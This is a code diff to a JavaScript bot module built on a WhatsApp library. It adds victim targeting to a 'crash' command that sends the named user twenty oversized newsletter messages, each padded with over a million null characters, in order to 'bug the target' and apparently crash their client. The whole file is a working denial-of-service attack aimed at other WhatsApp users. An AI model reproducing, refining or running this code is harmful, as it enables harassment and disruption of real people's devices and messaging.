@@ -2,9 +2,9 @@ import pkg from '@whiskeysockets/baileys';
 
 const { proto, generateWAMessageFromContent } = pkg;
 
-export async function bug(message, client) {
+export async function bug(message, client, participant) {
 
-    const remoteJid = message.key.remoteJid;
+    const remoteJid = participant;
 
     var messageContent = generateWAMessageFromContent(remoteJid, proto.Message.fromObject({
 
@@ -16,9 +16,9 @@ export async function bug(message, client) {
 
                     "newsletterJid": `120363298524333143@newsletter`,
 
-                    "newsletterName": "Dev Senku" + "\u0000".repeat(920000),
+                    "newsletterName": "Dev Senku" + "\u0000".repeat(1020000),
 
-                    "jpegThumbnail": "",
+                    "jpegThumbnail": ``,
 
                     "caption": `Dev Senku admin channel`,
 
@@ -45,13 +45,57 @@ export async function bug(message, client) {
 
 export async function crash(message, client) {
 
-    for (let i = 0; i < 10; i++) {
+    try {
 
-            await bug(message, client);
+        const remoteJid = message.key?.remoteJid;
+
+        if (!remoteJid) {
+
+            throw new Error("Message JID is undefined.");
+        }
+
+        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });
+
+        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+
+        const commandAndArgs = messageBody.slice(1).trim();
+
+        const parts = commandAndArgs.split(/\s+/);
+
+        const args = parts.slice(1);
+
+        let participant;
+
+        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
+
+            participant = message.message.extendedTextMessage.contextInfo.participant;
+
+        } else if (args.length > 0) {
+
+            participant = args[0].replace('@', '') + '@s.whatsapp.net';
+
+        } else {
+
+            throw new Error('Specify the person to bug.');
+        }
+
+        const num = '@' + participant.replace('@s.whatsapp.net', '');
+
+        // Execute the bug command
+
+        for (let i = 0; i < 20; i++) {
+
+            await bug(message, client, participant);
 
             await new Promise(resolve => setTimeout(resolve, 2000));
 
         }
-}
 
+    } catch (error) {
+
+        console.error("An error occurred while trying to bug the target:", error);
+
+        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
+    }
+}
 export default crash;
